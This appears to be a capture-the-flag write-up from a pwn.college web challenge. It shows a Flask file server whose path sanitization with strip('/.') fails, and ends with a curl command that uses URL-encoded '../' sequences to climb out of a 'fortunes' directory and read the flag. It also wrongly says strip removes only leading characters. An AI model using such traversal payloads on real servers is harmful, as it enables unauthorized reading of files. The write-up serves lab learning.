This is similar to the first one but with a bit of path sanitization.

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)
  
@app.route("/", methods=["GET"])
@app.route("/<path:path>", methods=["GET"])

def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")

    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The website also returns a list of files that we can access in the `fortunes` directory.

It uses the `strip` method from python to strip any `/` or `.` character from the path string. So if we try our previous solution, it wouldn't work here.

The `strip` method will only remove leading character that matches any of the specified delimiting characters. So once it hits some character that is not in the specified delimiting characters, it will stop stripping.

So we can try accessing the `fortunes` directory to bypass the `strip` function. Then we can traverse upwards in the directory to read the flag.

```bash
curl -v "http://challenge.localhost:80/fortunes%2f..%2f..%2f..%2fflag"
```